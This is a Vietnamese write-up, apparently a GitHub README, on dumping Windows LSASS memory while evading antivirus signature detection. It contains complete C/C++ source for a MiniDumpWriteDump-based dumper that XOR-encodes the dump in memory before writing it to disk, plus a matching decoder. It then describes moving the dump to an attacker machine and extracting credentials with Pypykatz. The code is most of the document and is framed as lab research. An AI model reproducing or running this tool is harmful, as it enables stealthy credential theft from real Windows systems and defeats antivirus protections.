# Description 
Mimikatz là công cụ mã nguồn mở dùng để khai thác và phân tích cơ chế xác thực của Windows, nổi bật với khả năng trích xuất thông tin đăng nhập từ LSASS, SAM và tương tác với Kerberos.

Các vấn đề của Mimikatz:
- Dễ bị Antivirus phát hiện thông qua chữ ký (Signature-based Detection).
- Bị EDR giám sát hành vi truy cập LSASS và Credential Dumping.
- Một số chức năng yêu cầu quyền Administrator hoặc SYSTEM.
- Bị hạn chế bởi các cơ chế bảo vệ như Credential Guard và LSA Protection.
- Khả năng tương thích có thể bị ảnh hưởng bởi các bản cập nhật Windows.

# Troubleshoot
Dump Credential của người dùng trên máy, thường sẽ dump từ lsass.exe và có rất nhiều công cụ phổ biến và cách làm khác nhau, chưa chắc đã bắt buộc phải cần Minikaiz.
## Giả thuyết
- Mimikaiz là một công cụ đã quá phổ biến, vậy nên chắc chắn sẽ có Signature trên các hệ thống AV, vậy nên nếu tải thẳng Mimikatz lên máy nạn nhân thì Mimikaiz sẽ bị bắt.
- Nếu sử dụng công cụ khác có được không?
  + Lsass.exe khi chạy là 1 process đặc trưng, ít có ai tác động đến nó, nếu tác động vào nó và đặc biệt là dump process đó ra thì đó sẽ là hành động lạ và AV/EDR sẽ bắt ngay.
  + AV chỉ bắt file data đã được dump ở dưới ổ đĩa.

## Time Line 
- Khám phá công cụ Mimikatz (Tôi nghiên cứu thêm về các tính năng của Mimikatz, những tính năng nằm ngoài việc dump process lsass.exe).
- Thử dump bằng các cách khác (Tôi dump bằng task manager và procdump, nhưng vẫn bị AV bắt).
- Quan sát hành động của AV (AV nhận file dmp được dump ra từ process chạy lsass.exe là Malware).
- Viết 1 công cụ dump khác.
- Dump được dữ liệu thì liền transfer dữ liệu đó về máy Attacker để phân tích.

## Kết luận 
- Dữ liệu được dump ra sẽ chứa credential của người dùng, nên AV khi đọc được phần này (Signature) sẽ liền xóa đi luôn.
- Cần trả lời câu hỏi: Trong trường hợp file dmp bị mã hóa trước khi rơi xuống ổ đĩa thì sao?

# Step to reproduce 
Bước 1: Quan sát hành động của AV khi dump data 
Sau khi tiến hành dump data bằng nhiều cách khác nhau, tôi nhận thấy, file dmp được dump thường bị bắt, chứ không phải do hành động can thiệp vào tiến trình dump
<img width="973" height="655" alt="image" src="https://github.com/user-attachments/assets/1f38637f-9e88-452e-a8dd-0c9f1cf04ed0" />

Bước 2: 
Viết tools từ windows API thử nghiệm giả thuyết, là mã hóa dữ liệu trước khi lưu vào ổ đĩa </br>

Tham khảo mã nguồn dưới đây:

```C/C++
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "Advapi32.lib")

using namespace std;


LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;

void dbgLastError(const char* ctx) {
	DWORD e = GetLastError();
	printf("[-] ERROR at %s: GetLastError=%lu (0x%lx)\n", ctx, e, e);
}

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
		case IoStartCallback:
			callbackOutput->Status = S_FALSE;
			break;
		case IoWriteAllCallback:
			callbackOutput->Status = S_OK;
			

			source = callbackInput->Io.Buffer;
			
			destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
			
			bufferSize = callbackInput->Io.BufferBytes;
			bytesRead += bufferSize;
			
			RtlCopyMemory(destination, source, bufferSize);
			
			printf("[+] Minidump offset: 0x%llx; length: 0x%x\n", (unsigned long long)callbackInput->Io.Offset, bufferSize);
			break;

		case IoFinishCallback:
			callbackOutput->Status = S_OK;
			break;

		default:
			return true;
	}
	return TRUE;
}

int main(int argc, char* argv[]) {
	DWORD PID = 0;
	DWORD bytesWritten = 0;
	HANDLE processHandle = NULL;
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	if (argc < 2) {
		fprintf(stderr, "Usage: %s < PID>\n", argv[0]);
		return 1;
	}

	PID = (DWORD)strtoul(argv[1], NULL, 10);
	printf("[*] Target PID = %lu (0x%lx)\n", PID, PID);


	processHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);
	if (processHandle == NULL) {
		dbgLastError("OpenProcess");
		printf("[-] OpenProcess failed. \n");
		return 1;
	}
	printf("[+] OpenProcess OK, handle=0x%p\n", processHandle);
	

	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	printf("[*] Starting MiniDumpWriteDump...\n");
	BOOL isDumped = MiniDumpWriteDump(processHandle, PID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
	printf("[*] MiniDumpWriteDump returned: %s (bytesRead=%u)\n", isDumped ? "TRUE" : "FALSE", bytesRead);

	if (!isDumped) {
		dbgLastError("MiniDumpWriteDump");
	}

	if (isDumped) 
	{
		const BYTE xorKey = 0x5A; 
		BYTE* pBuf = (BYTE*)dumpBuffer;
		for (DWORD i = 0; i < bytesRead; i++) {
			pBuf[i] ^= xorKey;
		}
		printf("[+] XOR encoding done (key=0x%02x, %u bytes)\n", xorKey, bytesRead);

		HANDLE outFile = CreateFile(L"process.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (outFile == INVALID_HANDLE_VALUE) {
			dbgLastError("CreateFile");
			printf("[-] CreateFile failed.");
			return 1;
		}
		printf("[+] CreateFile OK, handle=0x%p\n", outFile);

		if (WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL))
		{
			printf("\n[+] process dumped from 0x%p to process.dmp (%u bytes)\n", dumpBuffer, bytesWritten);
		}
		else {
			dbgLastError("WriteFile");
		}
		CloseHandle(outFile);
	}

	printf("[*] Done. Cleaning up.\n");
	CloseHandle(processHandle);
	return 0;
}
}
```
Phân tích mã nguồn: 
- Mã nguồn sử dụng các Windows API chính như: OpenProcess, MiniDumpWriteDump, CreateFile, WriteFile </br>
- Logic của mã nguồn: PID được truyền vào chương trình, sau đó chương trình sẽ mở process có PID đó ra và tiến hành trích xuất thông tin. Sau khi trích xuất được thông tin thì liền mã hóa lại bằng thuật toán XOR và lưu trên ổ cứng</br>

Cần phải có chương trình giải mã:

Tham khảo mã nguồn dưới đây: 

``` C/C++ 
#include <windows.h>
#include <stdio.h>

// Cung khoa XOR voi dump_process.exe
#define XOR_KEY 0x5A

int main(int argc, char* argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <input.dmp> <output.dmp>\n", argv[0]);
        fprintf(stderr, "  Giai ma file da XOR (key=0x%02x)\n", XOR_KEY);
        return 1;
    }

    LPCSTR inPath = argv[1];
    LPCSTR outPath = argv[2];

    // Mo file input (da XOR)
    HANDLE inFile = CreateFileA(inPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (inFile == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        printf("[-] CreateFile(input) failed: %lu (0x%lx)\n", e, e);
        return 1;
    }

    // Lay kich thuoc file
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(inFile, &fileSize)) {
        DWORD e = GetLastError();
        printf("[-] GetFileSizeEx failed: %lu (0x%lx)\n", e, e);
        CloseHandle(inFile);
        return 1;
    }
    DWORD totalSize = (DWORD)fileSize.QuadPart;
    printf("[*] Input file: %s (%u bytes)\n", inPath, totalSize);

    // Cap phat buffer
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalSize);
    if (!buf) {
        printf("[-] HeapAlloc failed\n");
        CloseHandle(inFile);
        return 1;
    }

    // Doc file vao buffer
    DWORD bytesRead = 0;
    if (!ReadFile(inFile, buf, totalSize, &bytesRead, NULL) || bytesRead != totalSize) {
        DWORD e = GetLastError();
        printf("[-] ReadFile failed: %lu (0x%lx), got %u/%u\n", e, e, bytesRead, totalSize);
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(inFile);
        return 1;
    }
    CloseHandle(inFile);
    printf("[+] Read OK (%u bytes)\n", bytesRead);

    // XOR giai ma (XOR la phep tu nghich dao: ma~ XOR key = clear)
    for (DWORD i = 0; i < bytesRead; i++) {
        buf[i] ^= XOR_KEY;
    }
    printf("[+] XOR decryption done (key=0x%02x, %u bytes)\n", XOR_KEY, bytesRead);

    // Mo file output de ghi
    HANDLE outFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (outFile == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        printf("[-] CreateFile(output) failed: %lu (0x%lx)\n", e, e);
        HeapFree(GetProcessHeap(), 0, buf);
        return 1;
    }

    DWORD bytesWritten = 0;
    if (!WriteFile(outFile, buf, bytesRead, &bytesWritten, NULL)) {
        DWORD e = GetLastError();
        printf("[-] WriteFile failed: %lu (0x%lx)\n", e, e);
    }
    else {
        printf("[+] Written %u bytes to %s\n", bytesWritten, outPath);
    }

    // Cleanup
    CloseHandle(outFile);
    HeapFree(GetProcessHeap(), 0, buf);

    printf("[*] Done.\n");
    return 0;
}
```

Bước 3: Tiến hành thí nghiệm trên môi trường Lab </br>
Tiến hành dump thành công dưới quyền administrator:</br>
<img width="1021" height="741" alt="image" src="https://github.com/user-attachments/assets/408b0795-e3ab-44af-adb8-269a5b9f8878" />

Sau khi dump thành công, ta sẽ có file dmp bị mã hóa: <br>
<img width="621" height="375" alt="image" src="https://github.com/user-attachments/assets/37364c68-8f18-4ee2-bdfc-15c43e8dc3dc" />

Sau khi lấy được file dmp, ta sẽ transfer file này về máy Attacker và giải mã rồi tiến hành phân tích data với Pypikatz </br>

Giải mã thành công </br>
<img width="493" height="223" alt="image" src="https://github.com/user-attachments/assets/19c96284-5f95-474f-9fa7-c0520b88dd45" />

Phân tích data với Pypikatz và thành công lấy được credential </br>
<img width="877" height="648" alt="image" src="https://github.com/user-attachments/assets/59931b36-30b7-4c94-bff6-a3e949501135" />



# Reference
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
https://github.com/ParrotSec/mimikatz
